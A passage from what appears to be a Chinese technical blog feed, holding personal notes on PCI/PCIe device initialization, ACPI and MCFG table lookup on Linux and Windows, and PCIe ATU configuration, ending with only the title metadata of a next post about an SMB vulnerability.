class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">pci_enable_device(<span class="keyword">struct</span> pci_dev *dev)</span><br><span class="line">pci_enable_device_flags(<span class="keyword">struct</span> pci_dev *dev, <span class="type">unsigned</span> <span class="type">long</span> IORESOURCE_MEM|IORESOURCE_IO)&#123;</span><br><span class="line">read bars from PCI;</span><br><span class="line">do_pci_enable_device(dev, bars);</span><br><span class="line"><span class="comment">// power on</span></span><br><span class="line">pci_set_power_state(enable)&#123;<span class="comment">// 可能pcie才需要这个</span></span><br><span class="line">                     pci_set_full_power_state(dev)&#123;</span><br><span class="line">                         pci_power_up(dev)&#123;</span><br><span class="line">                             pci_write_config_word(dev, dev-&gt;pm_cap + PCI_PM_CTRL, <span class="number">0</span>);<span class="comment">//PCI_PM_CTRL=4</span></span><br><span class="line">                         &#125;</span><br><span class="line">                     &#125;</span><br><span class="line">    <span class="comment">//*(pcie+pcie-&gt;cap_pointer +4) = PCI_D0;//PCI_D0 = 0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// enable IO bar</span></span><br><span class="line">pcibios_enable_device(<span class="keyword">struct</span> pci_dev *dev, <span class="type">int</span> bars)</span><br><span class="line">pci_enable_resources(dev, bars);&#123;</span><br><span class="line"><span class="comment">// if bar is 6, means ROM resource</span></span><br><span class="line">r = &amp;dev-&gt;resource[i];</span><br><span class="line"><span class="keyword">if</span> (r-&gt;flags &amp; IORESOURCE_IO)</span><br><span class="line">cmd |= PCI_COMMAND_IO;</span><br><span class="line"><span class="keyword">if</span> (r-&gt;flags &amp; IORESOURCE_MEM)</span><br><span class="line">cmd |= PCI_COMMAND_MEMORY;</span><br><span class="line">pci_write_config_word(dev, PCI_COMMAND, cmd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// check interrupt and enable</span></span><br><span class="line"><span class="keyword">if</span> (dev-&gt;msi_enabled || dev-&gt;msix_enabled)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">pci_write_config_word(dev, PCI_COMMAND,</span><br><span class="line">      cmd &amp; ~PCI_COMMAND_INTX_DISABLE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 配置pci bar空间</span></span><br><span class="line">pci_request_regions(pci, <span class="string">&quot;ICH HD audio&quot;</span>);</span><br><span class="line">pci_request_selected_regions(pdev, ((<span class="number">1</span> &lt;&lt; <span class="number">6</span>) - <span class="number">1</span>), res_name);&#123;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">__pci_request_region(pdev, i, res_name, excl))&#123;</span><br><span class="line"><span class="keyword">if</span> (pci_resource_flags(pdev, bar) &amp; IORESOURCE_IO)&#123;</span><br><span class="line">request_region(pci_resource_start(pdev, bar),pci_resource_len(pdev, bar), res_name)<span class="comment">// 不做啥, 只是告诉内核要用这个内存</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">__request_mem_region(pci_resource_start(pdev, bar),pci_resource_len(pdev, bar), res_name,exclusive)<span class="comment">//不做啥, 只是告诉内核要用这个内存</span></span><br><span class="line">&#125;</span><br><span class="line">dr = find_pci_dr(pdev);</span><br><span class="line"><span class="keyword">if</span> (dr)</span><br><span class="line">dr-&gt;region_mask |= <span class="number">1</span> &lt;&lt; bar;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ioremap</span></span><br><span class="line">addr = pci_resource_start(pci, <span class="number">0</span>);<span class="comment">// get bar0</span></span><br><span class="line">ioremap(addr, pci_resource_len(pdev, <span class="number">0</span>));</span><br><span class="line">pci_set_master(pci);</span><br><span class="line">__pci_set_master(<span class="keyword">struct</span> pci_dev *dev, <span class="type">bool</span> enable)&#123;</span><br><span class="line">            pci_read_config_word(dev, PCI_COMMAND, &amp;old_cmd);</span><br><span class="line">cmd = old_cmd | PCI_COMMAND_MASTER;</span><br><span class="line">pci_write_config_word(dev, PCI_COMMAND, cmd);</span><br><span class="line">        &#125;</span><br><span class="line">pcibios_set_master(dev);&#123;</span><br><span class="line">            <span class="keyword">if</span> (pci_is_pcie(dev))</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            pci_read_config_byte(dev, PCI_LATENCY_TIMER, &amp;lat);</span><br><span class="line">            <span class="keyword">if</span> (lat &lt; <span class="number">16</span>)</span><br><span class="line">                lat = (<span class="number">64</span> &lt;= pcibios_max_latency) ? <span class="number">64</span> : pcibios_max_latency;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (lat &gt; pcibios_max_latency)</span><br><span class="line">                lat = pcibios_max_latency;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            pci_write_config_byte(dev, PCI_LATENCY_TIMER, lat);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pci_pm_init</span><span class="params">(<span class="keyword">struct</span> pci_dev *dev)</span>&#123;</span><br><span class="line">    pm = pci_find_capability(dev, PCI_CAP_ID_PM)&#123;</span><br><span class="line">        pos = __pci_bus_find_cap_start(dev-&gt;bus, dev-&gt;devfn, dev-&gt;hdr_type)&#123;</span><br><span class="line">            pci_bus_read_config_word(bus, devfn, PCI_STATUS, &amp;status);</span><br><span class="line">            <span class="keyword">if</span> (!(status &amp; PCI_STATUS_CAP_LIST))</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (hdr_type) &#123;</span><br><span class="line">            <span class="keyword">case</span> PCI_HEADER_TYPE_NORMAL:</span><br><span class="line">            <span class="keyword">case</span> PCI_HEADER_TYPE_BRIDGE:</span><br><span class="line">                <span class="keyword">return</span> PCI_CAPABILITY_LIST;</span><br><span class="line">            <span class="keyword">case</span> PCI_HEADER_TYPE_CARDBUS:</span><br><span class="line">                <span class="keyword">return</span> PCI_CB_CAPABILITY_LIST;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pos)</span><br><span class="line">            pos = __pci_find_next_cap(dev-&gt;bus, dev-&gt;devfn, pos, cap)&#123;</span><br><span class="line">                <span class="type">int</span> ttl = PCI_FIND_CAP_TTL;</span><br><span class="line">                <span class="keyword">return</span> __pci_find_next_cap_ttl(bus, devfn, pos, cap, &amp;ttl)&#123;</span><br><span class="line">                    pci_bus_read_config_byte(bus, devfn, pos, &amp;pos);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span> ((*ttl)--) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (pos &lt; <span class="number">0x40</span>)</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        pos &amp;= ~<span class="number">3</span>;</span><br><span class="line">                        pci_bus_read_config_word(bus, devfn, pos, &amp;ent);</span><br><span class="line"></span><br><span class="line">                        id = ent &amp; <span class="number">0xff</span>;</span><br><span class="line">                        <span class="keyword">if</span> (id == <span class="number">0xff</span>)</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">if</span> (id == cap)</span><br><span class="line">                            <span class="keyword">return</span> pos;</span><br><span class="line">                        pos = (ent &gt;&gt; <span class="number">8</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> pos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="名词解析"><a href="#名词解析" class="headerlink" title="名词解析"></a>名词解析</h1><h3 id="PCI-Address-Domain"><a href="#PCI-Address-Domain" class="headerlink" title="PCI Address Domain"></a>PCI Address Domain</h3><p>The PCI address domain consists of three distinct address spaces: configuration, memory, and I&#x2F;O space. </p><h3 id="PCI-Configuration-Address-Space"><a href="#PCI-Configuration-Address-Space" class="headerlink" title="PCI Configuration Address Space"></a>PCI Configuration Address Space</h3><p>Configuration space is defined geographically; in other words, the  location of a peripheral device is determined by its physical location  within an interconnected tree of PCI bus bridges. A device is located by  its <strong>bus number</strong> and <strong>device</strong> (<strong>slot</strong>) <strong>number</strong>.  Each peripheral device contains a set of well-defined configuration  registers in its PCI configuration space. The registers are used not  only to identify devices but also to supply device configuration  information to the configuration framework. For example, base address  registers in the device configuration space must be mapped before a  device can respond to data access.  </p><p>The method for generating configuration cycles is host dependent. In  IA machines, special I&#x2F;O ports are used. On other platforms, the PCI  configuration space can be memory-mapped to certain address locations  corresponding to the PCI host bridge in the host address domain. When a  device configuration register is accessed by the processor, the request  is routed to the PCI host bridge. The bridge then translates the access  into proper configuration cycles on the bus. </p><h3 id="PCI-Configuration-Base-Address-Registers"><a href="#PCI-Configuration-Base-Address-Registers" class="headerlink" title="PCI Configuration Base Address Registers"></a>PCI Configuration Base Address Registers</h3><p>The PCI configuration space consists of up to six 32-bit base address  registers for each device. These registers provide both size and data  type information. System firmware assigns base addresses in the PCI  address domain to these registers.  </p><p>Each addressable region can be either memory or I&#x2F;O space. The value  contained in bit 0 of the base address register identifies the type. A  value of 0 in bit 0 indicates a memory space and a value of 1 indicates  an I&#x2F;O space. <a href="https://docs.oracle.com/cd/E19455-01/805-7378/6j6un038j/index.html#hwovr-fig-29">Figure A-4</a> shows two base address registers: one for memory; the other for I&#x2F;O types.</p><p>Figure A-4  Base Address Registers for Memory and I&#x2F;O</p><p><img src="/images/PCI/hwovr.fig69.epsi.gif" alt="Graphic"></p><h3 id="PCI-Memory-Address-Space"><a href="#PCI-Memory-Address-Space" class="headerlink" title="PCI Memory Address Space"></a>PCI Memory Address Space</h3><p>PCI supports both 32-bit and 64-bit addresses for memory space.  System firmware assigns regions of memory space in the PCI address  domain to PCI peripherals. The base address of a region is stored in the  base address register of the device’s PCI configuration space. The size  of each region must be a power of two, and the assigned base address  must be aligned on a boundary equal to the size of the region. Device  addresses in memory space are <strong>memory-mapped</strong> into the host address  domain so that data access to any device can be performed by the  processor’s native load or store instructions.  </p><h3 id="PCI-I-x2F-O-Address-Space"><a href="#PCI-I-x2F-O-Address-Space" class="headerlink" title="PCI I&#x2F;O Address Space"></a>PCI I&#x2F;O Address Space</h3><p>PCI supports 32-bit I&#x2F;O space. I&#x2F;O space can be accessed differently  on different platforms. Processors with special I&#x2F;O instructions, like  the Intel processor family, access the I&#x2F;O space with <code>in</code> and <code>out</code>  instructions. Machines without special I&#x2F;O instructions will map to the  address locations corresponding to the PCI host bridge in the host  address domain. When the processor accesses the memory-mapped addresses,  an I&#x2F;O request will be sent to the PCI host bridge. It then translates  the addresses into I&#x2F;O cycles and puts them on the PCI bus.  Memory-mapped I&#x2F;O is performed by the native load&#x2F;store instructions of  the processor.   </p><h3 id="PCI-Hardware-Configuration-Files"><a href="#PCI-Hardware-Configuration-Files" class="headerlink" title="PCI Hardware Configuration Files"></a>PCI Hardware Configuration Files</h3><p>Hardware configuration files should be unnecessary for PCI local bus  devices. However, on some occasions drivers for PCI devices need to use  hardware configuration files to augment the driver private information.  See <a href="https://docs.oracle.com/docs/cd/E19455-01/806-0633/6j9vn6q3i/index.html">driver.conf(4)</a> and <a href="https://docs.oracle.com/docs/cd/E19455-01/806-0633/6j9vn6q61/index.html">pci(4)</a> for further details. </p><h1 id="额外信息"><a href="#额外信息" class="headerlink" title="额外信息"></a>额外信息</h1><p><strong>pci_mcfg_lookup</strong></p><p><img src="/images/PCI/1566376943595.png" alt="1566376943595"></p><p><strong>Get bus number in windows</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get the BusNumber</span></span><br><span class="line">status = <span class="built_in">WdfDeviceQueryProperty</span>( device,</span><br><span class="line">DevicePropertyBusNumber,</span><br><span class="line"><span class="built_in">sizeof</span>(ULONG),</span><br><span class="line">(PVOID)&amp;busNumber,</span><br><span class="line">&amp;length);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">NT_SUCCESS</span>(status) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">error_print</span>(<span class="string">&quot;Failed to get PCIe bus number.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> https://lkml.org/lkml/2013/12/5/256 says: the &quot;change to</span></span><br><span class="line"><span class="comment">// definition of the &quot;Bus&quot; field into the recently released ACPI</span></span><br><span class="line"><span class="comment">// Spec 5.0a section 18.3.2.3-5: ... The Bus is encoded in bits 0-7.</span></span><br><span class="line"><span class="comment">// For systems that expose multiple PCI segment groups, the segment</span></span><br><span class="line"><span class="comment">// number is encoded in bits 8-23 and bits 24-31 must be zero.&quot;</span></span><br><span class="line">devContext-&gt;pcie_bus = (<span class="type">uint8_t</span>)busNumber;</span><br><span class="line">devContext-&gt;pcie_segment = (busNumber &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFFFF</span>;</span><br></pre></td></tr></table></figure><h2 id="ACPI"><a href="#ACPI" class="headerlink" title="ACPI"></a>ACPI</h2><p>ACPI（Advanced Configuration and Power Interface）Table是BIOS提供给OSPM的硬件配置数据，包括系统硬件的电源管理和配置管理，ACPI Table有很多表，根据存储的位置，可以分为：</p><p>1） RSDP位于F段，用于OSPM搜索ACPI Table，RSDP可以定位其他所有ACPI Table</p><p>2） FACS位于ACPI NVS内存，用于系统进行S3保存的恢复指针，内存为NV Store</p><p>3） 剩下所有ACPI Table都位于ACPI Reclaim内存，进入OS后，内存可以释放</p><p><img src="/images/PCI/acpitable.JPG" alt="img"></p><p>其中绿色代表在内存F段，蓝色是ACPI Reclaim内存，红色是NV store内存.</p><p>整个ACPI表以RSDP（Root System Descriptor Pointer<br>Table）为入口点，每个非叶子节点都会包含指向其他子表的指针，各个表都会有一个表头，在该表头中包含了相应的Signature，用于标识该表，有点类似与该表的ID，除此之外，在表头中还会包含Checksum、Revision、OEM ID等信息。所以查找ACPI表的关键就是在内存中定位到RSDP表。</p><p>对于基于Legacy BIOS的系统而言，RSDP表所在的物理地址并不固定，要么位于EBDA（Extended BIOS Data Area, 位于物理地址0x40E）的前1KB范围内；要么位于0x000E0000 到0x000FFFFF的物理地址范围内。Linux kernel在启动的时候，会去这两个物理地址范围，通过遍历物理地址空间的方法寻找RSDP表，即通过寻找RSDP表的Signature（RSD PTR）来定位RSDP的位置，并通过该表的length和checksum来确保找到的表是正确的。</p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><p><img src="/images/PCI/1646299430462.png" alt="1646299430462"></p><p>The RSDT is the main System Description Table. However there are many  kinds of SDT. All the SDT may be split into two parts. One (the header)  which is <strong>common</strong> to all the SDT an another (data) which is <strong>different</strong> for  each table. </p><p>The header structure of the header is: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ACPISDTHeader</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> Signature[<span class="number">4</span>];</span><br><span class="line">  <span class="type">uint32_t</span> Length;</span><br><span class="line">  <span class="type">uint8_t</span> Revision;</span><br><span class="line">  <span class="type">uint8_t</span> Checksum;</span><br><span class="line">  <span class="type">char</span> OEMID[<span class="number">6</span>];<span class="comment">//0x10</span></span><br><span class="line">  <span class="type">char</span> OEMTableID[<span class="number">8</span>];</span><br><span class="line">  <span class="type">uint32_t</span> OEMRevision;</span><br><span class="line">  <span class="type">uint32_t</span> CreatorID;<span class="comment">//0x20</span></span><br><span class="line">  <span class="type">uint32_t</span> CreatorRevision;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>通过暴力搜索内存中的”RSD PTR”字符串, 找到对应的内容. 定位+0x10指向的地址, 得到RSDT表.<a href="https://www.youtube.com/watch?v=dWrAaawmgvQ">参考视频</a></p><p><img src="/images/PCI/1566447934665.png" alt="1566447934665"></p><p><img src="/images/PCI/1566448122215.png" alt="1566448122215"></p><p><strong>MCFG table:</strong></p><p><img src="/images/PCI/1566376865146.png" alt="1566376865146"></p><p>其中44(0x2C)位置的 Base Address of enhanced configuration mechanism 就是 segment(有的成为group) 为 0 的<strong>MMConfig</strong> 的地址.</p><p><img src="/images/PCI/1566448244626.png" alt="1566448244626"></p><h2 id="Get-MMCFG-or-MCFG-in-kernel"><a href="#Get-MMCFG-or-MCFG-in-kernel" class="headerlink" title="Get MMCFG or MCFG in kernel"></a>Get MMCFG or MCFG in kernel</h2><p><a href="https://stackoverflow.com/questions/52136259/how-to-access-pci-express-configuration-space-via-mmio">How to access pci express configuration space via MMIO?</a> , <a href="http://developer.amd.com/wordpress/media/2012/10/pci%20-%20pci%20express%20configuration%20space%20access.pdf">pci express configuration space access</a> .</p><h3 id="windows-用户态"><a href="#windows-用户态" class="headerlink" title="windows 用户态"></a>windows 用户态</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">UINT WINAPI <span class="title function_">EnumSystemFirmwareTables</span><span class="params">(</span></span><br><span class="line"><span class="params">     _In_ DWORD FirmwareTableProviderSignature,</span></span><br><span class="line"><span class="params">     _Out_writes_bytes_to_opt_(BufferSize, <span class="keyword">return</span>) PVOID pFirmwareTableEnumBuffer,</span></span><br><span class="line"><span class="params">     _In_ DWORD BufferSize</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line">UINT WINAPI <span class="title function_">GetSystemFirmwareTable</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ DWORD FirmwareTableProviderSignature,</span></span><br><span class="line"><span class="params">    _In_ DWORD FirmwareTableID,</span></span><br><span class="line"><span class="params">    _Out_writes_bytes_to_opt_(BufferSize, <span class="keyword">return</span>) PVOID pFirmwareTableBuffer,</span></span><br><span class="line"><span class="params">    _In_ DWORD BufferSize</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="comment">// 第一次先取得 ACPI Tables Enum Buffer Size</span></span><br><span class="line">PBYTE buffer;</span><br><span class="line">DWORD buffer_size = EnumSystemFirmwareTables(<span class="string">&#x27;ACPI&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (buffer_size == <span class="number">0</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 產生一塊Buffer去取得 ACPI Tables Enum</span></span><br><span class="line">buffer = new BYTE[buffer_size];</span><br><span class="line"><span class="keyword">if</span> (EnumSystemFirmwareTables(<span class="string">&#x27;ACPI&#x27;</span>, buffer, buffer_size) != buffer_size)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">free</span>(buffer);</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line">   PBYTE table_uffer;</span><br><span class="line">   DWORD table_buffer_size;</span><br><span class="line"><span class="comment">// read MCFG table</span></span><br><span class="line">   <span class="keyword">if</span>(GetSystemFirmwareTable(<span class="string">&#x27;ACPI&#x27;</span>, <span class="string">&#x27;GFCM&#x27;</span>, table_uffer, buffer_size))&#123;</span><br><span class="line">      <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">sACPITableHeader</span> &#123;</span></span><br><span class="line">         BYTESignature[<span class="number">4</span>];</span><br><span class="line">         DWORDLength;</span><br><span class="line">         BYTERevision;</span><br><span class="line">         BYTEChecksum;</span><br><span class="line">         BYTEOEMID[<span class="number">6</span>];</span><br><span class="line">         BYTEOEMTableID[<span class="number">8</span>];</span><br><span class="line">         DWORDOEMRevision;</span><br><span class="line">         BYTECreatorID[<span class="number">4</span>];</span><br><span class="line">         DWORDCreatorRevision;</span><br><span class="line">     &#125; sACPITableHeader;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 取的 ACPI Table Buffer</span></span><br><span class="line">     <span class="comment">//... </span></span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure><h3 id="windows-内核态"><a href="#windows-内核态" class="headerlink" title="windows 内核态"></a>windows 内核态</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;aux_klib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Aux_Klib.lib&quot;</span>)</span></span><br><span class="line"><span class="type">void</span> * <span class="title function_">kzalloc</span><span class="params">(u32 size, u32 notuse)</span> &#123;</span><br><span class="line">UNREFERENCED_PARAMETER(notuse);</span><br><span class="line"><span class="type">void</span> *mem = ExAllocatePool(NonPagedPool, size);</span><br><span class="line"><span class="built_in">memset</span>(mem, <span class="number">0</span>, size);</span><br><span class="line"><span class="keyword">return</span> mem;</span><br><span class="line">&#125;</span><br><span class="line">u32 *pFirmwareTableEnumBuffer = kzalloc(<span class="number">0x4000</span>, <span class="number">0</span>);</span><br><span class="line">ret = AuxKlibInitialize();</span><br><span class="line">u32 ret = AuxKlibGetSystemFirmwareTable(</span><br><span class="line"><span class="string">&#x27;ACPI&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;GFCM&#x27;</span>,<span class="comment">//MCFG</span></span><br><span class="line">pFirmwareTableEnumBuffer,</span><br><span class="line"><span class="number">0x4000</span>,</span><br><span class="line">&amp;len</span><br><span class="line">);</span><br><span class="line">or </span><br><span class="line">ntStatus = AuxKlibEnumerateSystemFirmwareTables(</span><br><span class="line">   <span class="string">&#x27;ACPI&#x27;</span>,</span><br><span class="line">   <span class="literal">NULL</span>,</span><br><span class="line">   <span class="number">0</span>,</span><br><span class="line">   &amp;sigListSize</span><br><span class="line">   );</span><br><span class="line">buff = kzalloc(sigListSize);</span><br><span class="line">ntStatus = AuxKlibEnumerateSystemFirmwareTables(</span><br><span class="line">   <span class="string">&#x27;ACPI&#x27;</span>,</span><br><span class="line">   buff,</span><br><span class="line">   sigListSize,</span><br><span class="line">   <span class="literal">NULL</span></span><br><span class="line">   );</span><br></pre></td></tr></table></figure><h2 id="ATU-Address-Translation-Unit"><a href="#ATU-Address-Translation-Unit" class="headerlink" title="ATU(Address Translation Unit)"></a>ATU(Address Translation Unit)</h2><p>TLP中的地址哪里来？ATU转换过来的。这个问题就是这么的简单。ATU是什么？是一个地址转换单元，负责将一段存储器域的地址转换到PCIe总线域地址，除了地址转换外，还能提供访问类型等信息，这些信息都是ATU根据总线上的信号自己做的，数据都打包到TLP中，不用软件参与。软件需要做的是配置ATU，所以如果ATU配置完成，并且能正常工作，那么CPU访问PCIe空间就和访问本地存储器空间方法是一样的，只要读写即可。</p><p>这就解释了存储器地址和TLP地址字段的关系了。至此，地址相关的问题就解决了。</p><p>ATU配置举例：以kernel 4.4中designware PCIe host驱动为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">static void dw_pcie_prog_outbound_atu(struct pcie_port *pp, int index,</span><br><span class="line">int type, u64 cpu_addr, u64 pci_addr, u32 size)</span><br><span class="line">&#123;</span><br><span class="line">    // 使用哪个ATU</span><br><span class="line">dw_pcie_writel_rc(pp, PCIE_ATU_REGION_OUTBOUND | index,</span><br><span class="line">  PCIE_ATU_VIEWPORT);</span><br><span class="line">    // source地址（存储器域）的低32位</span><br><span class="line">dw_pcie_writel_rc(pp, lower_32_bits(cpu_addr), PCIE_ATU_LOWER_BASE);</span><br><span class="line">dw_pcie_writel_rc(pp, upper_32_bits(cpu_addr), PCIE_ATU_UPPER_BASE);</span><br><span class="line">    // space size</span><br><span class="line">dw_pcie_writel_rc(pp, lower_32_bits(cpu_addr + size - 1),</span><br><span class="line">  PCIE_ATU_LIMIT);</span><br><span class="line">    // 目标地址空间（PCIe总线地址）</span><br><span class="line">dw_pcie_writel_rc(pp, lower_32_bits(pci_addr), PCIE_ATU_LOWER_TARGET);</span><br><span class="line">dw_pcie_writel_rc(pp, upper_32_bits(pci_addr), PCIE_ATU_UPPER_TARGET);</span><br><span class="line">    // 空间类型（mem or IO）</span><br><span class="line">dw_pcie_writel_rc(pp, type, PCIE_ATU_CR1);</span><br><span class="line">    // 使能ATU</span><br><span class="line">dw_pcie_writel_rc(pp, PCIE_ATU_ENABLE, PCIE_ATU_CR2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;经常和虚拟化打交道, 一定会涉及到虚拟设备的初始化, 这就需要对硬件的初始化操作有一定的了解. 初始化硬件设备, 主要就是激活IO port 和IO memory的功能, 对于一些PCIe设备, 还可能需要激活一些capabilities. 本文的内容不是有条理的介绍, 更偏向于资料的整理. 希望可以帮助到大家.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>SMB RCE CVE-2022-35804的介绍</title>
    <link href="http://474172261.github.io/2022/08/11/CVE-2022-35804/"/>
    <id>http://474172261.github.io/2022/08/11/CVE-2022-35804/</id>
    <published>2022-08-11T02:06:20.093Z</published>
    <updated>2022-09-07T03:35:25.301Z</updated>
    
